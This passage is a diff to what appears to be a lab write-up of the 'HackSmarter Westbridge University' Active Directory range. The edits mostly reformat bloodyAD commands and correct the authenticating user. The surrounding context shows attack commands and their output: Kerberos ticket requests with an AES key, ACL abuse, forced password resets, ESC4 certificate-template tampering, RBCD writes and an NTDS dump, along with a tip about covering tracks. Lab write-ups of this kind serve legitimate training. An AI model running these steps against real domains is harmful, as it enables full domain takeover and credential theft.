@@ -3,7 +3,6 @@ layout: post
 title: "HackSmarter: Westbridge University (Range)"
 categories: [HackSmarter]
 tags: [windows-ad, range, trusted-header-bypass, ldap-injection, asrep-roast, no-preauth, cross-principal-tgs, kerberoast, bloodhound, forest-trust, shadow-credentials, silver-ticket, crystalpotato, seimpersonate, esc4, adcs, tombstone, rbcd, dcsync, ksu, keytab, constrained-delegation]
-slug: hsm-westbridge-university-range
 tag_anchors:
   trusted-header-bypass: "#32-demonstrating-the-bypass--x-remote-user"
   windows-ad: "#1-reconnaissance"
@@ -2634,7 +2633,9 @@ The command block below is the **alternative** — same exfil, same decoded keyt
         REALM : WESTBRIDGE.HSM
         SERVICE PRINCIPAL : svc_krb_t2/
         AES-256 HASH : 00280b95458c5a279cc4555cec5f0f49d30ff2f0551c155b44ab402bca775a54
+```
 
+```zsh
 ➜ getTGT.py westbridge.hsm/svc_krb_t2 \
     -aesKey 00280b95458c5a279cc4555cec5f0f49d30ff2f0551c155b44ab402bca775a54
 
@@ -2740,7 +2741,8 @@ First, convert the inherited `member` of `IT TIER2` group into a proper `Generic
 
 ```bash
 ➜ bloodyAD --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
-    -u svc_krb_t2 ccache=./svc_krb_t2.ccache -k \
+    -u svc_krb_t2 \
+    -k ccache=./svc_krb_t2.ccache \
     add genericAll 'OU=IT Tier2,DC=westbridge,DC=hsm' svc_krb_t2
 
 [+] svc_krb_t2 has now GenericAll on OU=IT Tier2,DC=westbridge,DC=hsm
@@ -2750,7 +2752,8 @@ Then reset a Tier-2 member's password — s.harrison is the IT TIER2 user we're 
 
 ```bash
 ➜ bloodyAD --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
-    -u svc_krb_t2 ccache=./svc_krb_t2.ccache -k \
+    -u svc_krb_t2 \
+    -k ccache=./svc_krb_t2.ccache \
     set password 's.harrison' 'SecretMyth123!'
 
 [+] Password changed successfully!
@@ -2789,7 +2792,8 @@ First look at what we're overwriting:
 ```bash
 ➜ bloodyAD \
     --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
-    -u svc_krb_t2 ccache=./svc_krb_t2.ccache -k \
+    -u svc_krb_t2 \
+    -k ccache=./svc_krb_t2.ccache \
     get object 's.harrison' \
     --attr logonHours --raw
 
@@ -2810,7 +2814,8 @@ logonHours: AAAAAAAAAAAAAP8BAAAAAAAAAAAA
 ```bash
 ➜ bloodyAD \
     --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
-    -u svc_krb_t2 ccache=./svc_krb_t2.ccache -k \
+    -u svc_krb_t2 \
+    -k ccache=./svc_krb_t2.ccache \
     set object 's.harrison' 'logonHours' --raw
 
 [+] s.harrison's logonHours has been updated
@@ -2819,7 +2824,8 @@ logonHours: AAAAAAAAAAAAAP8BAAAAAAAAAAAA
 ```bash
 ➜ bloodyAD \
     --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
-    -u svc_krb_t2 ccache=./svc_krb_t2.ccache -k \
+    -u svc_krb_t2 \
+    -k ccache=./svc_krb_t2.ccache \
     get object 's.harrison' \
     --attr logonHours --raw
 
@@ -2835,7 +2841,8 @@ The older form passed the value explicitly:
 ```bash
 ➜ bloodyAD \
     --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
-    -u svc_krb_t2 ccache=./svc_krb_t2.ccache -k \
+    -u svc_krb_t2 \
+    -k ccache=./svc_krb_t2.ccache \
     set object 's.harrison' 'logonHours' \
     -v '////////////////////////////' --b64
 
@@ -2846,7 +2853,8 @@ The older form passed the value explicitly:
 ```bash
 ➜ bloodyAD \
     --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
-    -u svc_krb_t2 ccache=./svc_krb_t2.ccache -k \
+    -u svc_krb_t2 \
+    -k ccache=./svc_krb_t2.ccache \
     get object 's.harrison' \
     --attr logonHours --raw
 
@@ -3200,7 +3208,8 @@ Member of **User Lifecycle Management** — the provisioning/cleanup role. And i
 
 ➜ bloodyAD \
     --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
-    -u a.pherson ccache=./a.pherson.ccache -k \
+    -u a.pherson \
+    -k ccache=./a.pherson.ccache \
     get membership 'a.pherson'
 
 distinguishedName: CN=Users,CN=Builtin,DC=westbridge,DC=hsm
@@ -3221,7 +3230,8 @@ Then the writable surface — the three tombstones are spelled out by name below
 ```bash
 ➜ bloodyAD \
     --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
-    -u a.pherson ccache=./a.pherson.ccache -k \
+    -u a.pherson \
+    -k ccache=./a.pherson.ccache \
     get writable
 
 distinguishedName: CN=Users,DC=westbridge,DC=hsm
@@ -3266,7 +3276,8 @@ Deleted-but-not-gone: three users in AD's recycle bin, and we hold restore right
 ```bash
 ➜ bloodyAD \
     --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
-    -u a.pherson ccache=./a.pherson.ccache -k \
+    -u a.pherson \
+    -k ccache=./a.pherson.ccache \
     set restore 'CN=j.dillon\0ADEL:d6178188-a0f8-4d9f-868f-20124885e4cb,CN=Deleted Objects,DC=westbridge,DC=hsm'
 
 [*] Restoring: CN=j.dillonADEL:d6178188-a0f8-4d9f-868f-20124885e4cb,CN=Deleted Objects,DC=westbridge,DC=hsm
@@ -3330,7 +3341,8 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 ```bash
 ➜ bloodyAD \
     --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
-    -u a.pherson ccache=./j.dillon.ccache -k \
+    -u j.dillon \
+    -k ccache=./j.dillon.ccache \
     add genericAll 'OU=IT Tier3,DC=westbridge,DC=hsm' j.dillon
 
 [+] j.dillon has now GenericAll on OU=IT Tier3,DC=westbridge,DC=hsm
@@ -3341,7 +3353,8 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 ```bash
 ➜ bloodyAD \
     --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
-    -u a.pherson ccache=./j.dillon.ccache -k \
+    -u j.dillon \
+    -k ccache=./j.dillon.ccache \
     set password 'a.owen' 'SecretMyth123!'
 
 [+] Password changed successfully!
@@ -3394,7 +3407,8 @@ The `SmartCardAuthentication` template is flagged **ESC4**. `a.owen` holds dange
 ```bash
 ➜ bloodyAD \
     --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
-    -u a.pherson ccache=./a.owen.ccache -k \
+    -u a.owen \
+    -k ccache=./a.owen.ccache \
     -s get writable --partition CONFIGURATION
 
 distinguishedName: CN=SmartCardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=westbridge,DC=hsm
@@ -3413,7 +3427,8 @@ Before rewriting the DACL, read the template's current rules:
 ```bash
 ➜ bloodyAD \
     --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
-    -u a.pherson ccache=./a.owen.ccache -k \
+    -u a.owen \
+    -k ccache=./a.owen.ccache \
     get object 'CN=SmartCardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=westbridge,DC=hsm' \
     --attr msPKI-Certificate-Name-Flag
 
@@ -3427,7 +3442,6 @@ We need to flip this to `1` (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`), which tells t
 
 > **The Theory:** For a deep-dive into the 13-bit supply-vs-require bitmask, OPSEC-safe OR-writes, and why we are manually flipping bits instead of using `certipy template -write-default-configuration`, read the dedicated breakdown: [Demystifying msPKI-Certificate-Name-Flag](/adcs/demystifying-mspki-certificate-name-flag/). For this lab, we just need the `1`.
 
-
 ## 17.3 Execution — Flip, Enroll, Authenticate
 
 > ADCS is the gift that keeps on giving. When `msPKI-Certificate-Name-Flag` is involved, you aren't just requesting a certificate; you're requesting the kingdom.
@@ -3439,7 +3453,8 @@ The kill chain: flip the flag, grant ourselves Enroll rights, pull the domain SI
 ```bash
 ➜ bloodyAD \
     --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
-    -u a.pherson ccache=./a.owen.ccache -k \
+    -u a.owen \
+    -k ccache=./a.owen.ccache \
     set object 'CN=SmartCardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=westbridge,DC=hsm' \
     msPKI-Certificate-Name-Flag -v 1
 
@@ -3451,7 +3466,8 @@ The kill chain: flip the flag, grant ourselves Enroll rights, pull the domain SI
 ```bash
 ➜ bloodyAD \
     --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
-    -u a.pherson ccache=./a.owen.ccache -k \
+    -u a.owen \
+    -k ccache=./a.owen.ccache \
     add genericAll 'CN=SmartCardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=westbridge,DC=hsm' a.owen
 
 [+] a.owen has now GenericAll
@@ -3505,7 +3521,8 @@ Restore the template baseline to keep the lab clean and hide your tracks:
 ```zsh
 ➜ bloodyAD \
     --host dc.westbridge.hsm -d westbridge.hsm -i 10.0.10.5 \
-    -u a.pherson ccache=./a.owen.ccache -k \
+    -u a.owen \
+    -k ccache=./a.owen.ccache \
     set object 'CN=SmartCardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=westbridge,DC=hsm' \
     msPKI-Certificate-Name-Flag -v 0
 ```
@@ -3594,6 +3611,7 @@ Verify the cached ticket still opens doors, then run the dump:
 ```bash
 ➜ env KRB5CCNAME=administrator.ccache \
 nxc smb dc.westbridge.hsm -k --use-kcache --ntds
+
 SMB         dc.westbridge.hsm 445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:westbridge.hsm) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
 SMB         dc.westbridge.hsm 445    DC               [+] WESTBRIDGE.HSM\administrator from ccache (Pwn3d!)
 SMB         dc.westbridge.hsm 445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
@@ -3941,7 +3959,8 @@ So the first move converts ownership into actual writability — grant ourselves
 ```bash
 ➜ env KRB5CCNAME=researchoperator.ccache \
 bloodyAD --host dc02.westbridge-research.hsm -d westbridge-research.hsm \
-    -u 'researchoperator' -k ccache=researchoperator.ccache \
+    -u 'researchoperator' \
+    -k ccache=researchoperator.ccache \
     add genericAll 'CN=Research Web Operations,CN=Users,DC=westbridge-research,DC=hsm' \
     'S-1-5-21-1978613116-3728955385-531918137-9519'
 
@@ -3983,7 +4002,8 @@ So: two writes, in order —
 ```zsh
 ➜ env KRB5CCNAME=researchoperator.ccache \
 bloodyAD --host dc02.westbridge-research.hsm -d westbridge-research.hsm \
-    -u 'researchoperator' -k ccache=researchoperator.ccache \
+    -u 'researchoperator' \
+    -k ccache=researchoperator.ccache \
     get object 'CN=Research Web Operations,CN=Users,DC=westbridge-research,DC=hsm' \
     --attr groupType --raw
 
@@ -3997,7 +4017,8 @@ First hop up the ladder:
 
 ```bash
 ➜ bloodyAD --host dc02.westbridge-research.hsm -d westbridge-research.hsm \
-    -u 'researchoperator' -k ccache=researchoperator.ccache \
+    -u 'researchoperator' \
+    -k ccache=researchoperator.ccache \
     set object 'CN=Research Web Operations,CN=Users,DC=westbridge-research,DC=hsm' \
     groupType -v '-2147483640'
 
@@ -4010,7 +4031,8 @@ Now flip to the final scope:
 
 ```bash
 ➜ bloodyAD --host dc02.westbridge-research.hsm -d westbridge-research.hsm \
-    -u 'researchoperator' -k ccache=researchoperator.ccache \
+    -u 'researchoperator' \
+    -k ccache=researchoperator.ccache \
     set object 'CN=Research Web Operations,CN=Users,DC=westbridge-research,DC=hsm' \
     groupType -v '-2147483644'
 
@@ -4023,7 +4045,8 @@ Check the final state to confirm the write stuck:
 
 ```zsh
 ➜ bloodyAD --host dc02.westbridge-research.hsm -d westbridge-research.hsm \
-    -u 'researchoperator' -k ccache=researchoperator.ccache \
+    -u 'researchoperator' \
+    -k ccache=researchoperator.ccache \
     get object 'CN=Research Web Operations,CN=Users,DC=westbridge-research,DC=hsm' \
     --attr groupType --raw
 
@@ -4037,7 +4060,8 @@ Now the group accepts cross-domain principals. One subtlety when adding ourselve
 
 ```bash
 ➜ bloodyAD --host dc02.westbridge-research.hsm -d westbridge-research.hsm \
-    -u 'researchoperator' -k ccache=researchoperator.ccache \
+    -u 'researchoperator' \
+    -k ccache=researchoperator.ccache \
     add groupMember 'CN=Research Web Operations,CN=Users,DC=westbridge-research,DC=hsm' \
     'S-1-5-21-1978613116-3728955385-531918137-9519'
 
@@ -4071,7 +4095,8 @@ With Research Web Operations membership in the PAC, the promised password resets
 
 ```bash
 ➜ bloodyAD --host dc02.westbridge-research.hsm -d westbridge-research.hsm -i 10.0.20.5 \
-    -u 'researchoperator' ccache=./researchoperator.ccache -k \
+    -u 'researchoperator' \
+    -k ccache=./researchoperator.ccache \
     set password 'r.parker' 'SecretMyth123!'
 
 [+] Password changed successfully!
@@ -4302,7 +4327,8 @@ One bloodyAD call writes the ACE. Same primitive as the FILES hop earlier, one f
 ```bash
 ➜ bloodyAD \
     --host dc02.westbridge-research.hsm -d westbridge-research.hsm -i 10.0.20.5 \
-    -u 'a.howard' ccache=./a.howard.ccache -k \
+    -u 'a.howard' \
+    -k ccache=./a.howard.ccache \
     add rbcd 'DC02$' 'WEB$'
 
 [!] No security descriptor has been returned, a new one will be created
